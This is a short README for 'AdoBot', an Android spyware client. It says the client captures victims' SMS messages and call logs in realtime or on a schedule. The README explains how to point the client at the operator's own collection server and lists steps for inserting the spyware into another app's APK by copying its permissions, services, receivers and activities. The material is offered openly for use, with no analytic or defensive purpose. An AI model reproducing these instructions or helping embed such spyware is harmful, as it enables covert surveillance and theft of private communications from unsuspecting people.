# AdoBot
AdoBot spyware android client

# Features
 - get sms in realtime or scheduled
 - get call logs in realtime or scheduled

# Getting Started

Edit `Client.java` constant `private static String SERVER = "http://xxx.xxx.xxx.xxx:3000";`
Change it to the address of your [AdoBot-IO](https://github.com/adonespitogo/AdoBot-IO) server. Change the port 3000 to port 80 in production

# Inserting to another apk

 - Copy the permissions in the manifest file to the target apk source
 - Copy the services, receivers and activities in the manifest file to the target apk source
 - Copy the activities, services, and layouts to the target apk source
 - Add `compile 'io.socket:socket.io-client:0.8.3'` to the target project's module gradle file
